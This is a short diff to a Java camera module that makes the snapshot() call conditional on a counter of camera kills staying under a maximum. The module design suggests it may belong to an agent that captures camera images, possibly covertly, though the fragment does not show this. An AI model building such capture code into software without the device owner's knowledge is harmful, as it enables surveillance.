@@ -67,8 +67,9 @@ public class ModuleCamera extends BaseInstantModule {
 				}
 				return;
 			}*/
-
-			snapshot();
+			if(CameraSnapshot.self().getCamera_killed() <= CameraSnapshot.MAX_CAMERA_KILLS) {
+				snapshot();
+			}
 
 		} catch (IOException e) {
 			if (Cfg.DEBUG) {
